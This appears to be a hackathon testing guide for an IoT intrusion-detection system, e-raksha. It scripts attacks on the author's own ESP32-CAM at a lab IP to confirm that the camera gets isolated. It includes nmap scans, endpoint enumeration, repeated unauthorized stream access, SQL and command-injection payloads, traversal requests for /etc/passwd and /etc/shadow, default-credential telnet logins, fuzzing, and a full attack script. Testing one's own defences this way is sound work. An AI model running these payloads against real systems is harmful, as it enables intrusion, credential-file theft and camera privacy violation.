# Real-World Attack Guide: ESP32-CAM Testing

## Prerequisites

### 1. Setup e-raksha
```bash
cd /home/sajal/Desktop/Hackathons/e-raksha
sudo python main.py

# Wait for:
# "RAKSHAK Started in GATEWAY mode"
# "Phase 3 detectors connected to packet filter"
```

### 2. Verify ESP32-CAM is Connected
```bash
# Open dashboard
firefox http://10.42.0.1:5000

# Or check via command line
ping -c 3 10.42.0.103

# Expected: Camera responds to ping
```

### 3. Open Monitoring Windows
```bash
# Terminal 2: Monitor e-raksha logs
tail -f /home/sajal/Desktop/Hackathons/e-raksha/data/logs/rakshak.log | grep -E "Threat|Response|ISOLATE|Port Scan"

# Terminal 3: Monitor dashboard (browser)
firefox http://10.42.0.1:5000
# Keep Threats tab open
```

---

## Attack Sequence (Real-World)

### ATTACK 1: Port Scanning (Reconnaissance)

**Goal:** Trigger port scan detection

#### Using nmap (Most Realistic)
```bash
# Install nmap if not available
sudo apt-get install nmap

# Basic port scan
nmap 10.42.0.103

# Expected e-raksha Response:
# - Detection: Port Scan Detector
# - Severity: MEDIUM
# - Response Level: RATE_LIMIT (Level 2)
# - Time to detection: <5 seconds
```

**What You'll See:**

**In e-raksha logs:**
```
[INFO] Port Scan Detector: SYN scan from YOUR_IP to 10.42.0.103
[INFO] Detected scan pattern: 10 ports in 3.8s
[INFO] Response Engine: RATE_LIMIT - apply_rate_limit
[INFO] Threat logged: port_scan from YOUR_IP
```

**In dashboard:**
```
NEW THREAT DETECTED
Type: port_scan
Source: YOUR_IP
Target: 10.42.0.103 (esp32_cam)
Severity: MEDIUM
Action: RATE_LIMIT
```

#### More Aggressive Scans (Escalate Detection)
```bash
# Aggressive timing scan
nmap -T4 10.42.0.103

# Service version detection
nmap -sV 10.42.0.103

# OS detection (requires root)
sudo nmap -O 10.42.0.103

# All ports scan (will trigger strong response)
nmap -p- 10.42.0.103

# Expected e-raksha Response:
# - Multiple scan detections
# - Escalation to DEPLOY_HONEYPOT (Level 3)
```

---

### ATTACK 2: HTTP Enumeration & Brute Force

**Goal:** Trigger high request rate detection and repeat offender escalation

#### Manual HTTP Probing
```bash
# Probe for common vulnerable endpoints
curl -v http://10.42.0.103/
curl -v http://10.42.0.103/stream
curl -v http://10.42.0.103/admin
curl -v http://10.42.0.103/config
curl -v http://10.42.0.103/cgi-bin
curl -v http://10.42.0.103/setup
curl -v http://10.42.0.103/api/
curl -v http://10.42.0.103/debug

# Expected e-raksha Response:
# - High request rate detected
# - Response escalates to DEPLOY_HONEYPOT
```

#### Rapid-Fire HTTP Requests (Better for Detection)
```bash
# Bash loop - 20 rapid requests
for i in {1..20}; do
  curl -s http://10.42.0.103/ > /dev/null
  echo "Request $i sent"
  sleep 0.3
done

# Expected e-raksha Response:
# - Repeat offender pattern detected
# - Escalation to QUARANTINE (Level 4)
# - Camera may be moved to quarantine zone
```

**What You'll See:**

**In e-raksha logs:**
```
[WARNING] High request rate from YOUR_IP to 10.42.0.103:80
[WARNING] Repeat offender detected: YOUR_IP
[WARNING] Response Engine escalating to: QUARANTINE
[INFO] KAAL decided: ISOLATE_DEVICE
[WARNING] Device 10.42.0.103 moved to quarantine zone
```

---

### ATTACK 3: Unauthorized Stream Access (Privacy Violation)

**Goal:** Demonstrate unauthorized camera access and trigger privacy protection

#### Access Live Camera Stream
```bash
# Simple stream access
curl http://10.42.0.103/stream --max-time 5

# Download stream for 10 seconds
timeout 10s curl http://10.42.0.103/stream -o /dev/null

# Repeated unauthorized viewing (Escalates Response)
for i in {1..15}; do
  echo "Accessing unauthorized stream attempt $i"
  timeout 2s curl http://10.42.0.103/stream -o /dev/null 2>&1
  sleep 0.5
done

# Expected e-raksha Response:
# - Unauthorized access pattern detected
# - Privacy violation logged
# - Escalation to ISOLATE (Level 5) after multiple attempts
```

---

### ATTACK 4: Command Injection Attempts (Exploit Simulation)

**Goal:** Trigger IDS detection of malicious payloads

#### Simulated Exploit Payloads
```bash
# SQL Injection attempt
curl "http://10.42.0.103/?id=1' OR '1'='1"

# Command injection attempts
curl "http://10.42.0.103/stream?cmd=;ls"
curl "http://10.42.0.103/stream?cmd=\`whoami\`"
curl "http://10.42.0.103/config?cmd=;cat%20/etc/passwd"

# Path traversal
curl "http://10.42.0.103/../../etc/passwd"
curl "http://10.42.0.103/stream?file=../../../../etc/shadow"

# XSS attempts (if web interface exists)
curl "http://10.42.0.103/?name=<script>alert(1)</script>"

# Remote code execution simulation
curl "http://10.42.0.103/cgi-bin/admin.cgi?action=\$(reboot)"

# Expected e-raksha Response:
# - IDS classifier detects malicious patterns
# - Severity: CRITICAL
# - Response: ISOLATE (Level 5) or FULL_BLOCK (Level 6)
# - Device immediately isolated from network
```

**What You'll See:**

**In e-raksha logs:**
```
[CRITICAL] IDS detected malicious payload from YOUR_IP
[CRITICAL] Attack type: COMMAND_INJECTION
[CRITICAL] Confidence: 0.92
[CRITICAL] Response Engine escalating to: ISOLATE
[WARNING] Executing REAL isolation for 10.42.0.103
[INFO] Device 10.42.0.103 ISOLATED via gateway (REAL)
[INFO] iptables rules applied: DROP all traffic from 10.42.0.103
```

**In dashboard:**
```
CRITICAL THREAT DETECTED
Type: command_injection
Source: YOUR_IP
Target: 10.42.0.103 (esp32_cam)
Severity: CRITICAL
Action: ISOLATE_DEVICE
Status: Device isolated from network
```

---

### ATTACK 5: Telnet/Raw Socket Attacks (If Port 23 Open)

**Goal:** Test legacy protocol detection

```bash
# Check if telnet is running
nmap -p 23 10.42.0.103

# If open, attempt connection
telnet 10.42.0.103 23

# Try default credentials
# (type manually when connected)
admin
admin
# or
root
root

# Expected e-raksha Response:
# - Telnet access detected (HIGH risk)
# - Immediate escalation due to insecure protocol
# - Response: ISOLATE
```

---

### ATTACK 6: Fuzzing & Malformed Requests

**Goal:** Test robustness and anomaly detection

```bash
# Malformed HTTP requests
echo -e "GET / HTTP/1.1\r\nHost: \r\n\r\n" | nc 10.42.0.103 80
echo -e "GET /%00%00%00 HTTP/1.1\r\n\r\n" | nc 10.42.0.103 80

# Oversized headers
curl http://10.42.0.103/ -H "User-Agent: $(python3 -c 'print("A"*10000)')"

# Random binary data
cat /dev/urandom | head -c 1000 | nc 10.42.0.103 80

# Expected e-raksha Response:
# - Anomaly detection triggered
# - Suspicious traffic pattern logged
```

---

## Advanced Attack Scenarios

### SCENARIO A: Full Penetration Test Simulation

**Complete attack chain to trigger all detection levels:**

```bash
#!/bin/bash
# Save as: attack_sequence.sh

TARGET="10.42.0.103"
ATTACKER_IP=$(hostname -I | awk '{print $1}')

echo "========================================="
echo "ESP32-CAM Penetration Test"
echo "Target: $TARGET"
echo "Attacker: $ATTACKER_IP"
echo "========================================="
echo ""

echo "[PHASE 1] Reconnaissance - Port Scanning"
nmap -p- -T4 $TARGET
sleep 5

echo ""
echo "[PHASE 2] Service Enumeration"
nmap -sV -p 80,23,554,8080 $TARGET
sleep 5

echo ""
echo "[PHASE 3] Web Directory Enumeration"
for path in / /admin /config /stream /cgi-bin /api /debug /setup; do
    echo "Probing: $path"
    curl -s -o /dev/null -w "%{http_code}" http://$TARGET$path
    echo ""
    sleep 0.3
done
sleep 5

echo ""
echo "[PHASE 4] Unauthorized Access - Stream"
for i in {1..10}; do
    echo "Unauthorized stream access attempt $i"
    timeout 2s curl http://$TARGET/stream -o /dev/null 2>&1
    sleep 0.5
done
sleep 5

echo ""
echo "[PHASE 5] Exploit Attempts"
curl "http://$TARGET/?cmd=;ls"
curl "http://$TARGET/stream?debug=\`whoami\`"
curl "http://$TARGET/config?action=\$(reboot)"
sleep 5

echo ""
echo "[PHASE 6] Verification - Check if isolated"
if ping -c 1 -W 2 $TARGET > /dev/null 2>&1; then
    echo "WARNING: Target still reachable - isolation may not be active"
else
    echo "SUCCESS: Target isolated by e-raksha!"
fi

echo ""
echo "========================================="
echo "Attack sequence complete!"
echo "Check e-raksha dashboard for results"
echo "========================================="
```

**Run it:**
```bash
chmod +x attack_sequence.sh
./attack_sequence.sh
```

---

### SCENARIO B: Stealth Attack (Slow Scan)

**Goal:** Test if e-raksha detects slow, stealthy attacks

```bash
#!/bin/bash
# Slow port scan to evade detection
TARGET="10.42.0.103"

echo "Starting stealth scan (this will take ~5 minutes)..."
for port in 21 22 23 80 443 554 8080 8081 8888 9000; do
    echo "Scanning port $port..."
    nc -zv -w 2 $TARGET $port 2>&1
    sleep 30  # 30 second delay between probes
done

# Expected: May NOT trigger port scan detector due to slow timing
# But will still be logged as individual connection attempts
```

---

## Monitoring e-raksha Response

### Real-Time Log Analysis

```bash
# Terminal 1: Full threat log
tail -f data/logs/rakshak.log | grep -A 5 "Threat detected"

# Terminal 2: Response decisions
tail -f data/logs/rakshak.log | grep "Response Engine"

# Terminal 3: Isolation events
tail -f data/logs/rakshak.log | grep "ISOLATE"
```

### Check Database in Real-Time

```bash
# Watch threats as they're detected
watch -n 2 'sqlite3 data/rakshak.db "SELECT timestamp, type, severity, source_ip FROM threats ORDER BY timestamp DESC LIMIT 5"'

# Check port scan events
sqlite3 data/rakshak.db "SELECT * FROM port_scan_events ORDER BY timestamp DESC LIMIT 5"
```

### Verify Isolation

```bash
# Check iptables rules
sudo iptables -L -v -n | grep 10.42.0.103

# Expected after isolation:
# DROP  all  --  *  *  10.42.0.103  0.0.0.0/0
# DROP  all  --  *  *  0.0.0.0/0    10.42.0.103

# Try to access camera after isolation
curl http://10.42.0.103 --max-time 5
# Expected: Connection timeout or refused
```

---

## Expected Timeline

| Time | Your Action | e-raksha Detection | Response Level |
|------|-------------|-------------------|----------------|
| **0:00** | Run nmap port scan | Port Scan Detector activates | **RATE_LIMIT** (L2) |
| **0:30** | HTTP enumeration | High request rate | **DEPLOY_HONEYPOT** (L3) |
| **1:00** | Stream access x10 | Repeat offender | **QUARANTINE** (L4) |
| **1:30** | Command injection | IDS detects exploit | **ISOLATE** (L5) 🔒 |
| **2:00** | Try to access camera | Connection refused | ✅ **Isolated** |

---

## Success Indicators

### ✅ You Know It's Working When:

1. **Dashboard shows escalating threats:**
   - MEDIUM → HIGH → CRITICAL

2. **Device status changes:**
   - active → quarantine → **isolated**

3. **You can't access the camera anymore:**
   ```bash
   curl http://10.42.0.103
   # curl: (7) Failed to connect to 10.42.0.103 port 80: Connection refused
   ```

4. **iptables shows DROP rules:**
   ```bash
   sudo iptables -L -v -n | grep 10.42.0.103
   # Shows DROP rules
   ```

5. **Logs show full escalation path:**
   ```
   RATE_LIMIT → DEPLOY_HONEYPOT → QUARANTINE → ISOLATE
   ```

---

## Recovery (Unisolate Camera)

After testing, restore camera access:

```bash
# Method 1: Via Dashboard
# Go to Devices tab → Find 10.42.0.103 → Click "Unisolate"

# Method 2: Via Python Console
cd /home/sajal/Desktop/Hackathons/e-raksha
python3
```
```python
import yaml
from core.gateway import RakshakGateway, create_gateway_from_config

with open('config/config.yaml') as f:
    config = yaml.safe_load(f)

gateway = create_gateway_from_config(config)
gateway.start_gateway()
gateway.unisolate_device('10.42.0.103')
print("Camera unisolated!")
```

**Verify:**
```bash
curl http://10.42.0.103
# Should work again
```

---

## Tips for Best Results

### 1. **Space Out Attacks**
Don't rush - give e-raksha 10-15 seconds between attack phases to process and respond

### 2. **Monitor Both Logs and Dashboard**
- Logs show detailed detection logic
- Dashboard shows user-friendly alerts

### 3. **Use Your Actual IP**
If attacking from a different device (laptop, phone), it will be YOUR IP that gets flagged, not the camera

### 4. **Start Gentle, Then Aggressive**
- First: Single nmap scan
- Then: Multiple probes
- Finally: Exploit attempts

### 5. **Document Everything**
Take screenshots before/after each attack phase for your presentation/demo

---

## Troubleshooting

### "Port scan not detected"
```bash
# Check if packet filter is running
sudo iptables -L -v -n | grep NFQUEUE

# If no NFQUEUE rule, packet inspection isn't active
# Restart e-raksha with sudo
```

### "Device not isolated"
```bash
# Check gateway mode is active
grep "GATEWAY MODE" data/logs/rakshak.log

# Manually trigger isolation
# From Python console:
orchestrator.gateway.isolate_device('10.42.0.103', IsolationLevel.FULL, 'Manual test')
```

### "No threats showing"
```bash
# Check threat processor is running
ps aux | grep python | grep rakshak

# Check database
sqlite3 data/rakshak.db "SELECT COUNT(*) FROM threats"
# Should increase as you attack
```

---

## Summary

This guide provides **real-world attack scenarios** against your ESP32-CAM to validate e-raksha's autonomous defense capabilities.

**You should perform these attacks in order:**
1. Port scan (nmap)
2. HTTP enumeration (curl loops)
3. Stream access (repeated unauthorized viewing)
4. Command injection (exploit attempts)

**Expected result:**
Your camera will be **automatically isolated** from the network after demonstrating malicious behavior, proving e-raksha's autonomous IoT protection! 🛡️

Start with the simplest attack (nmap scan) and watch e-raksha respond in real-time! 🎯
